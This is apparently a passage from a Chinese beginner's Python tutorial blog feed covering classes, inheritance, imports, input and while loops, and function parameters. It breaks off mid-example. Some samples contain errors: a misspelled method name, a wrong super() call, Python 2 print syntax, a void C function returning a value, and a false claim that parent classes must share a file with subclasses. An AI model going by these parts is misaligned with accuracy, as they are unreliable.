class="string">&#x27;角C&#x27;</span>:angleC, <span class="string">&#x27;面积&#x27;</span>:square, <span class="string">&#x27;周长&#x27;</span>:circle&#125;</span><br><span class="line"></span><br><span class="line">result=calculate(<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">result[<span class="string">&#x27;角A&#x27;</span>]</span><br><span class="line">-&gt;<span class="number">0.8127555613686607</span></span><br><span class="line"></span><br><span class="line">result[<span class="string">&#x27;面积&#x27;</span>]</span><br><span class="line">-&gt;<span class="number">20.33316256758894</span></span><br></pre></td></tr></table></figure><p>这样做看上去解决了问题，但是假如我们并不需要返回全部的结果，比如只需要面积和周长呢？但是Python不会管这么多，它只会将所有数据结果都输出出来。处理规模小的数据可能没什么影响，但如果处理大批数据的话显然会严重影响Python的效率。</p><p>你也许会说，简单，我再传入一个参数d，在函数中国加几个if判断，来选择应用哪个函数不就好了。但是这样无疑把问题大大复杂化了，一个简单的问题非要实现的这么复杂，是多此一举的。</p><p>我们希望实现以下的效果。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义一个“大的东西”，名字就叫triangle</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="comment"># 一番神奇的操作，然后</span></span><br><span class="line"></span><br><span class="line">tr1=triangle(<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>)  <span class="comment"># 把三条边长传给这个大的东西，然后就生成一个三角形赋给tr1</span></span><br></pre></td></tr></table></figure><p>我们可以把triangle理解为一个<strong>三角形生成器</strong>，它通过我们传入的三条边长自动生成了一个<strong>三角形</strong>，并把这个三角形赋予变量tr1。</p><p>然后我们就可以对tr1进行操作。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tr1.a</span><br><span class="line">-&gt;<span class="number">6</span></span><br><span class="line"></span><br><span class="line">tr1.b</span><br><span class="line">-&gt;<span class="number">7</span></span><br><span class="line"></span><br><span class="line">tr1.c</span><br><span class="line">-&gt;<span class="number">8</span></span><br><span class="line"></span><br><span class="line">tr1.angleA()</span><br><span class="line">-&gt;<span class="number">0.8127555613686607</span></span><br><span class="line"></span><br><span class="line">tr1.angleB()</span><br><span class="line">-&gt;<span class="number">1.0107210205683146</span></span><br><span class="line"></span><br><span class="line">tr1.angleC()</span><br><span class="line">-&gt;<span class="number">1.318116071652818</span></span><br></pre></td></tr></table></figure><p>于是，我们引入了**“类”<strong>的概念。其实，我们在操作字符串、列表、字典等这些内置对象时用的方法，和我们现在看起来一样。只不过现在这个“三角形”，是我们自创的而已。所谓类，就是给我们提供了</strong>自定义对象**的能力。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math  <span class="comment"># 计算反三角函数要用到</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">triangle</span>:  <span class="comment"># 定义类：三角形生成器</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,a,b,c</span>):  <span class="comment"># 成员函数，声明需要与外部交互的参数（类的属性）</span></span><br><span class="line">        self.a=a  <span class="comment"># 先看着</span></span><br><span class="line">        self.b=b  <span class="comment"># 这几个东西是干嘛的后面会讲</span></span><br><span class="line">        self.c=c</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">angleA</span>(<span class="params">self</span>):  <span class="comment"># 计算函数（类的方法）</span></span><br><span class="line">        agA=math.acos((self.b**<span class="number">2</span>+self.c**<span class="number">2</span>-self.a**<span class="number">2</span>)/(<span class="number">2</span>*self.b*self.c))</span><br><span class="line">        <span class="keyword">return</span> agA</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">angleB</span>(<span class="params">self</span>):  <span class="comment"># 公式看不懂的回去翻课本去</span></span><br><span class="line">        agB=math.acos((self.c**<span class="number">2</span>+self.a**<span class="number">2</span>-self.b**<span class="number">2</span>)/(<span class="number">2</span>*self.a*self.c))</span><br><span class="line">        <span class="keyword">return</span> agB</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">angleC</span>(<span class="params">self</span>):</span><br><span class="line">        agC=math.acos((self.a**<span class="number">2</span>+self.b**<span class="number">2</span>-self.c**<span class="number">2</span>)/(<span class="number">2</span>*self.a*self.b))</span><br><span class="line">        <span class="keyword">return</span> agC</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">square</span>(<span class="params">self</span>):</span><br><span class="line">        p=(self.a+self.b+self.c)/<span class="number">2</span></span><br><span class="line">        s=math.sqrt(p*(p-self.a)*(p-self.b)*(p-self.c))</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">circle</span>(<span class="params">self</span>):</span><br><span class="line">        cz=self.a+self.b+self.c</span><br><span class="line">        <span class="keyword">return</span> cz</span><br></pre></td></tr></table></figure><p>具体的写法也不难，无非就是先声明包含的参数，再写包含的函数就行。</p><p>使用的时候也很简单，类是自定级对象的规则，那么我们首先做的事就是先传入参数，生成具体的对象（也就是<strong>实例化</strong>）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tr1=triangle(<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>)<span class="comment">#这一步就是实例化</span></span><br></pre></td></tr></table></figure><p>总结，所有的对象，不论是Python内置的，还是import第三方包里的，或者是我们自己用类定义然后实例化的，它们都由两部分构成。</p><ul><li>一部分是像a、b、c这样的<strong>数据</strong>，他们决定这个对象<strong>是什么</strong>并将其实例化。</li><li>一部分是像angleA()、angleB()、angleC()这样的<strong>函数</strong>，它们表示用这些数据<strong>做什么</strong></li></ul><p><strong>在面向对象的编程中，一个对象的数据，称之为对象的属性；一个对象所拥有的函数，称之为对象的方法。</strong></p><p>以上简单的介绍了类的概念，然后可能还有一些小问题：</p><h3 id="第一个函数def-__init__有什么作用"><a class="markdownIt-Anchor" href="#第一个函数def-__init__有什么作用"></a> 第一个函数def __init()__有什么作用？</h3><p>顾名思义，init就是<strong>初始化</strong>（initiation）的意思，即初始化函数。也就是实例化类的时候自动运行的函数。比如我们实例化时传递了参数给类，那么参数就交由init函数来处理，指定传入的参数如何使用。当然，你也可以在init函数中加上任何你希望初始化时就执行完毕的函数，比如<code>print('实例化已完成')</code>什么的都是可以的。</p><p>但是大部分时候，我们在实例化时最希望做的事是把传入的数据传递给类的属性，即由init函数来指定参数如何使用。<strong>大部分情况下，init函数都充当了构造函数的作用，它可以把传进的数据赋给某个变量，或者经过预处理后再赋予给某个变量。</strong></p><p>就例如在生成三角形中，我们是先给三角形传递了三条边长，而不是实例化完之后再依次tr1.a=6、tr1.b=7这样一个个赋值。所以我们在init函数中写明了数据的传递规则。</p><h4 id="给属性设定默认值"><a class="markdownIt-Anchor" href="#给属性设定默认值"></a> 给属性设定默认值</h4><p>除此之外，我们还可以在init函数中设定默认值，这样我们就可以实现一个无须由形参定义的属性。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">triangle</span>:  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,a,b,c</span>): </span><br><span class="line">        --snip--</span><br><span class="line">        self.d=<span class="number">0</span><span class="comment">#我也不知道这是什么参数，只是为了告诉你可以指定默认值</span></span><br></pre></td></tr></table></figure><h4 id="修改属性的值"><a class="markdownIt-Anchor" href="#修改属性的值"></a> 修改属性的值</h4><p>在传入参数实例化之后，我们除了查看外，仍然可以再次修改传递的参数。</p><h5 id="a直接修改属性的值"><a class="markdownIt-Anchor" href="#a直接修改属性的值"></a> a.直接修改属性的值</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tr1.a</span><br><span class="line">-&gt;<span class="number">6</span></span><br><span class="line"></span><br><span class="line">tr1.a=<span class="number">7</span></span><br><span class="line">tr1.a</span><br><span class="line">-&gt;<span class="number">7</span></span><br></pre></td></tr></table></figure><p>我们可以通过直接访问属性对其进行更新，但是我们还有其他方法。</p><h5 id="b通过方法修改属性的值"><a class="markdownIt-Anchor" href="#b通过方法修改属性的值"></a> b.通过方法修改属性的值</h5><p>如果可以用方法更新属性的值，那么你可以无须访问属性的值而只需要将数据传递给方法来更新属性，这一点很有用。比如我们可以定义一个方法update_a()。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">triangle</span>:</span><br><span class="line">    --snip--</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">updata_a</span>(<span class="params">self,delta</span>):</span><br><span class="line">        self.a=delta</span><br><span class="line">        </span><br><span class="line">tr1=triangle(<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>)</span><br><span class="line">tr1.update_a(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(tr1.a)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;6</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="c通过方法递增属性的值"><a class="markdownIt-Anchor" href="#c通过方法递增属性的值"></a> c.通过方法递增属性的值</h5><p>这一点与b点大致相同，将<code>self.a=delta</code>修改为<code>self.a+=delta</code>即可达到目标。</p><h3 id="self有什么作用为什么要写selfa等"><a class="markdownIt-Anchor" href="#self有什么作用为什么要写selfa等"></a> self有什么作用，为什么要写self.a等</h3><p>我们在使用对象的属性时，格式是“对象名.属性名”。但是在定义类时，由于尚未实例化，我们还不知道对象的名称，所以要随便写一个（但是要求前后一致），一般都写self。</p><p>这里我们再加上书本上的练习来加深印象。</p><h2 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h2><p><em><strong>9-3</strong> 用户 ：创建一个名为User 的类，其中包含属性first_name 和last_name ，还有用户简介通常会存储的其他几个属性。在类User 中定义一个名为describe_user() 的方法，它打印用户信息摘要；再定义一个名为greet_user() 的方法，它向用户发出个性化的问候。</em></p><p><em>创建多个表示不同用户的实例，并对每个实例都调用上述两个方法。</em></p><p><em><strong>9-5</strong> 尝试登录次数：在为完成练习9-3而编写的User 类中，添加一个名为login_attempts 的属性。编写一个名为increment_login_attempts() 的方法， 它将属性login_attempts 的值加1。再编写一个名为reset_login_attempts() 的方法，它将属性login_attempts 的值重置为0。</em></p><p><em>根据User 类创建一个实例，再调用方法increment_login_attempts() 多次。打印属性login_attempts 的值，确认它被正确地递增；然后，调用方 法reset_login_attempts() ，并再次打印属性login_attempts 的值，确认它被重置为0。</em></p><p>代码如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,fname,lname,nname</span>):</span><br><span class="line">        self.first_name=fname</span><br><span class="line">        self.last_name=lname</span><br><span class="line">        self.nick_name=nname</span><br><span class="line">        self.login_attempts=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">describe_user</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;User&#x27;s first name is &quot;</span>+self.first_name.title())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;User&#x27;s last name is &quot;</span>+self.last_name.title())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;User&#x27;s nick name is &quot;</span>+self.nick_name.title())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">greet_user</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Hello! Mr &quot;</span>+self.first_name.title(),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot; &quot;</span>+self.last_name.title()+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">increment_login_attempts</span>(<span class="params">self</span>):</span><br><span class="line">        self.login_attempts+=<span class="number">1</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">reset_login_attempts</span>(<span class="params">self</span>):</span><br><span class="line">        self.login_attempts=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">user1=User(<span class="string">&#x27;adam&#x27;</span>,<span class="string">&#x27;ben&#x27;</span>,<span class="string">&#x27;jjg&#x27;</span>)</span><br><span class="line">user2=User(<span class="string">&#x27;victory&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;globefish&#x27;</span>)</span><br><span class="line">user3=User(<span class="string">&#x27;frank&#x27;</span>,<span class="string">&#x27;li&#x27;</span>,<span class="string">&#x27;panda&#x27;</span>)</span><br><span class="line"></span><br><span class="line">user1.describe_user()</span><br><span class="line">user1.greet_user()</span><br><span class="line"></span><br><span class="line">user2.describe_user()</span><br><span class="line">user2.greet_user()</span><br><span class="line"></span><br><span class="line">user3.describe_user()</span><br><span class="line">user3.greet_user()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">5</span>):</span><br><span class="line">    user1.increment_login_attempts()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(user1.login_attempts)</span><br><span class="line">user1.reset_login_attempts()</span><br><span class="line"><span class="built_in">print</span>(user1.login_attempts)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;User&#x27;s first name is Adam</span></span><br><span class="line"><span class="string">User&#x27;s last name is Ben</span></span><br><span class="line"><span class="string">User&#x27;s nick name is Jjg</span></span><br><span class="line"><span class="string">Hello! Mr Adam Ben</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">User&#x27;s first name is Victory</span></span><br><span class="line"><span class="string">User&#x27;s last name is V</span></span><br><span class="line"><span class="string">User&#x27;s nick name is Globefish</span></span><br><span class="line"><span class="string">Hello! Mr Victory V</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">User&#x27;s first name is Frank</span></span><br><span class="line"><span class="string">User&#x27;s last name is Li</span></span><br><span class="line"><span class="string">User&#x27;s nick name is Panda</span></span><br><span class="line"><span class="string">Hello! Mr Frank Li</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">5</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="继承"><a class="markdownIt-Anchor" href="#继承"></a> 继承</h2><p>编写类的时候，不一定每一次都必须要从空白开始。如果一个类要是用一个现有的类作为基础，那么你可以使用**“继承”<strong>，一个类继承另一个类时，将自动获得另一个类的所有属性和方法。此时新类叫做</strong>“子类”<strong>，原有的类则称为</strong>“父类”**。子类除了继承父类原有的属性和方法，还可以定义自己特有的属性和方法。</p><p>示例如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    --snip--</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserCn</span>(<span class="title class_ inherited__">User</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,fname,lname,nname</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(self,fname,lname,nname)</span><br><span class="line">        self.location=<span class="string">&#x27;China&#x27;</span><span class="comment">#定义子类独有的属性，在继承完后独立添加即可</span></span><br><span class="line">        </span><br><span class="line">user1=UserCn(<span class="string">&#x27;adam&#x27;</span>,<span class="string">&#x27;ben&#x27;</span>,<span class="string">&#x27;jjg&#x27;</span>)</span><br><span class="line">user1.greet_user()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Hello! Mr Adam Ben</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>使用继承时要注意的几点：</p><ul><li><p>继承时，父类必须与子类包含在同一文件中，且位于子类前面。</p></li><li><p>定义子类时，括号内必须指定要继承的父类名称，并在__init__方法中接收创建父类时要接受的信息。</p></li><li><p>super是一个特殊的函数，它让你调用父类的方法。这行代码首先调用父类的__init__方法，让子类创建的实例包含这个方法的所有属性。因此父类也被称为**“超类”**。</p></li><li><p><strong>再次总结一遍，在继承中子类的__init__方法用来继承父类的属性，super函数则用来调用父类的方法。</strong></p></li><li><p><strong>不要去看多继承</strong></p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Adam8en/blogImage/images/20230910105940.png" alt="" /></p><h3 id="重写父类"><a class="markdownIt-Anchor" href="#重写父类"></a> 重写父类</h3><p>对于父类的方法，如果其不符合子类模拟实物的行为，可以进行<strong>重写</strong>。为此，可以在子类中定义一个与父类同名的方法覆盖。</p><p>重写父类可以让子类只继承父类中的精华，而去其糟粕。</p><h3 id="将实例作为属性"><a class="markdownIt-Anchor" href="#将实例作为属性"></a> 将实例作为属性</h3><p>有时候，你会发现给一个类添加的细节越来越多，造成类的内容过于冗杂。这种情况下，可以将一些相对比较独立的类分离出来单独作为一个小类，而大类则由小类组成。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Name</span>:</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;将name单独独立出来作为一个类&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,fname,lname,nname</span>):</span><br><span class="line">        self.first_name=fname</span><br><span class="line">        self.last_name=lname</span><br><span class="line">        self.nick_name=nname</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_name</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;My name is &quot;</span>+self.first_name.title()+<span class="string">&#x27; &#x27;</span>+self.last_name.title())</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,fname,lname,nname</span>):</span><br><span class="line">        self.name=Name(fname,lname,nname)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">greet_user</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Hello! Mr &quot;</span>+self.name.first_name.title(),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot; &quot;</span>+self.name.last_name.title()+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">user1=User(<span class="string">&#x27;adam&#x27;</span>,<span class="string">&#x27;ben&#x27;</span>,<span class="string">&#x27;jjg&#x27;</span>)</span><br><span class="line">user1.name.print_name()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;My name is Adam Ben</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="导入类"><a class="markdownIt-Anchor" href="#导入类"></a> 导入类</h2><p>导入类的方法和导入函数的方法相同。有时候我们定义的类太多导致文件内容太长，为了保持Python文件的简洁性，我们可以把类的定义单独储存在一个文件中，然后将该文件作为模块导入主程序。这样我们可以专心与研究代码的高级逻辑结构而无须注意更细节的底层逻辑。</p><p>假如我们将User和Name类的定义储存在user.py文件中，然后在主程序main.py中导入改模块，我们有以下几种导入方式。</p><ol><li><code>from user import User,Name</code>只将类导入文件，导入多个类可以用逗号分隔。</li><li><code>import user</code>导入整个模块，但是在实例化和使用类时必须要加上文件名前缀。比如要将<code>user1</code>变量实例化，我们必须这么写<code>user1=user.User('adam','ben,'jjg')</code>。</li><li><code>from user import *</code>导入所有类，不推荐这么写，可能会导致命名冲突。且这么做隐匿了导入类的名称，让程序员难以判断导入类的信息。</li></ol><p>除此之外，还可以在模块中导入模块。比如再将Name类分离储存在name.py文件中，那么我们就需要在user.py中也是用import导入name.py中的类，否则主程序将会报错。</p><h2 id="类编码风格"><a class="markdownIt-Anchor" href="#类编码风格"></a> 类编码风格</h2><p>有关类的编码风格，我们有一些约定俗成的规矩。</p><ul><li>类名应该采用<strong>驼峰命名法</strong>，即类名的每个单词首字母都大写而不使用下划线。</li><li>实例名和模块名都采用小写格式，并在每个单词之间加上下划线。</li><li>对于每个类，后面都应该紧跟一个文档字符串，用来简单的描述类的功能。每个模块亦是如此，用于描述该模块包含的类的作用。</li><li>可以使用空行来组织代码，但不能滥用。可以使用一个空行分隔不同的方法；在模块中，可以使用两个空行来分隔不同的类。</li><li>对于同时导入标准库中的模块和自定义模块时，都应该先编写标准库的import语句，再添加一个空行，随后再导入自己的自定义模块。这样能够更容易让人明白程序使用的各个模块都来自何处。</li></ul><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/%E5%A4%8D%E4%BB%B6%2086800272_p0%20(1).jpg" alt="复件 86800272_p0 (1)" /></p>]]></content>
      
      
      <categories>
          
          <category> Python学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始学Python（三）</title>
      <link href="/posts/5ebe3da80955/"/>
      <url>/posts/5ebe3da80955/</url>
      
        <content type="html"><![CDATA[<p>紧接上文，在介绍完Python基础的数据类型后，我们这次来学习一下Python中的用户输入和while循环，重点在于函数和模块的讲解。</p><hr /><h1 id="七-用户输入和while循环"><a class="markdownIt-Anchor" href="#七-用户输入和while循环"></a> 七、用户输入和while循环</h1><h2 id="input函数"><a class="markdownIt-Anchor" href="#input函数"></a> input函数</h2><p>不同于C语言的scanf，gets等函数，Python使用input函数来与用户交互，用户可以通过input函数向计算机输入数据。一般情况下，默认输入的数据格式是字符串，即使输入数字也是如此。如果想要从用户的输入中获取整数，需要使用int函数。这一点类似于C语言中的强制类型转换。</p><p>可以向input函数传递字符串参数，作为用户输入的提示。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name=<span class="built_in">input</span>(<span class="string">&quot;Please input your name so I can greet you: &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello! &quot;</span>+name)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Please input your name so I can greet you: </span></span><br><span class="line"><span class="string">Adam Ben</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Hello! Adam Ben</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="while函数"><a class="markdownIt-Anchor" href="#while函数"></a> while函数</h2><p>while函数在Python和C语言中用法大致相同。比如都有循环体，都要规定循环条件等。只有一点细微的差别，比如Python中while循环要加冒号且不需要将循环条件用括号括起来等。</p><p>除此之外，continue函数和break函数用法都与C语言相同，这里不再赘述。</p><h3 id="操作"><a class="markdownIt-Anchor" href="#操作"></a> 操作</h3><p>运用while函数可以很方便的对字典和列表进行操作。比如移动列表元素（pop），循环删除列表元素（remove），由用户循环输入字典（input）等。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> name != <span class="string">&#x27;no&#x27;</span>:</span><br><span class="line">    name=<span class="built_in">input</span>(<span class="string">&quot;What&#x27;s your dream place? Tell me please&quot;</span>+<span class="string">&quot;\n(enter no to quit)&quot;</span>+<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> name!=<span class="string">&#x27;no&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Your dream place is &quot;</span>+name)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;What&#x27;s your dream place? Tell me please</span></span><br><span class="line"><span class="string">(enter no to quit):chenzhou</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Your dream place is chenzhou</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;What&#x27;s your dream place? Tell me please</span></span><br><span class="line"><span class="string">(enter no to quit): no</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="八-函数"><a class="markdownIt-Anchor" href="#八-函数"></a> 八、函数</h1><p><strong>函数</strong>是有名字的代码块。</p><h2 id="定义函数"><a class="markdownIt-Anchor" href="#定义函数"></a> 定义函数</h2><p>在Python中，函数的定义需要使用关键字def，如下定义了一个简单的函数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;显示问候语&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello!&quot;</span>)</span><br><span class="line">    </span><br><span class="line">greet()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Hello!</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这一点与C语言有不同。在C语言中，定义函数的格式是：</p><ul><li>函数返回值的数据类型</li><li>函数名</li><li>函数形参的数据类型</li><li>函数形参名</li><li>如果没有参数或者返回值为空需要注明void</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">greet</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而Python中的def又很容易让人想起C语言中的#define关键字，似乎在Python中的函数只不过是将函数名与代码块的简单替换。</p><h2 id="传递参数"><a class="markdownIt-Anchor" href="#传递参数"></a> 传递参数</h2><p>在Python中，我们可以向函数传递参数，我们传递的是<strong>实际参数</strong>，而函数中定义的是<strong>形式参数</strong>。形参又分为<strong>位置形参</strong>和<strong>关键字形参</strong>。</p><p>位置形参即一般的向函数传递参数，此时Python会自动将形参的位置与实参的位置关联，向形参传递一份实参的副本。因此在位置形参中，传递参数的顺序相当重要，否则可能会引发意想不到的错误。</p><p>关键字形参即在参数传递中直接指定形参名给它传递参数，应用关键字形参时，Python可以不用考虑参数传递顺序，因为Python已经知道该给哪个形参传递对应的值，但是要保证关键字形参的输入正确无误。</p><p>在函数中，还可以设定默认值，这样在函数调用中若没有参数传递，Python会自动使用已经设定好的默认值作为形参进行调用。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">weather,name,word=<span class="string">&#x27;Hi! &#x27;</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(word+name+<span class="string">f&quot; What a <span class="subst">&#123;weather&#125;</span> day!&quot;</span>)</span><br><span class="line"></span><br><span class="line">greet(<span class="string">&#x27;Sunny&#x27;</span>,name=<span class="string">&#x27;Ben&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Hi! Ben What a Sunny day!</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>实际上我在编写上面这个代码时遇到不少小问题，一开始我的函数参数定义顺序是name、weather、word。但是这样传递参数我遇到了两个问题：</p><ul><li>当传递参数的顺序为’Sunny’,name='Ben’时，程序会报错提示变量name接收的多个参数</li><li>当传递参数顺序为,name=‘Ben’.'Sunny’时，程序也会报错提示位置变量不能在关键字变量之后</li></ul><p>为了避免这些情况，在调用函数时尽量不要混用传参类型，或者注意参数传递顺序。</p><p>除了传递参数外，还可以使用return语句定义函数的返回值，返回值可以是普通的值，也可以是列表，字典等。</p><p>我们也可以向函数传递列表。但是不同于传递位置参数，一般形式的传递列表会让函数直接操作列表本身的值而并非是列表的副本。这一点和向C语言函数传递数组类似，不过在C语言中传递数组的本质是传递数组的指针。如果在Python中你并不想修改列表本身的值而只是想让函数操作列表的副本，可以利用切片的方法。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example=[<span class="string">&#x27;adam&#x27;</span>,<span class="string">&#x27;ben&#x27;</span>,<span class="string">&#x27;jjg&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> e:</span><br><span class="line">        <span class="built_in">print</span> i</span><br><span class="line"></span><br><span class="line">test(example)<span class="comment">#传递列表本身</span></span><br><span class="line">test(example[:])<span class="comment">#传递列表副本</span></span><br></pre></td></tr></table></figure><h3 id="传递任意数量的实参"><a class="markdownIt-Anchor" href="#传递任意数量的实参"></a> 传递任意数量的实参</h3><p>在定义函数时加上一个星号*，代表可以接受任意数量的实参，函数将创建一个列表接收数据。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">*name</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> name:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Hello! &quot;</span>+i)</span><br><span class="line"></span><br><span class="line">greet(<span class="string">&#x27;adam&#x27;</span>)</span><br><span class="line">greet(<span class="string">&#x27;ben&#x27;</span>,<span class="string">&#x27;jjg&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span 